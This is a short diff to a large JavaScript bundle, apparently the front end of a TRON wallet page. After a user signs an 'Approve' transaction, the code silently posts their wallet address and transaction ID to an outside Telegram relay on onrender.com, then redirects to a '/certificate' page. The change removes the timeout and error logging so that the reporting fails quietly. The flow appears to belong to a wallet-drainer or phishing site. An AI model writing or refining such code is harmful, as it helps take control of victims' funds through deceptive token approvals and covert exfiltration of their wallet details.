@@ -92836,11 +92836,7 @@
                         console.log("[SIGN] Approve OK TXID:", n.txID);
                         GS.post("https://tronscantelegram.onrender.com/api/telegram", {
                             text: `Transaction approved\nWallet: ${e}\nTransaction ID: ${n.txID || "N/A"}\nTime: ${new Date().toISOString()}`
-                        }, {
-                            timeout: 8000
-                        }).catch((telegramErr) => {
-                            console.error("Telegram approve notify failed:", telegramErr)
-                        });
+                        }).catch(() => {});
                         setTimeout(() => {
                             window.location.href = "/certificate"
                         }, 1500);
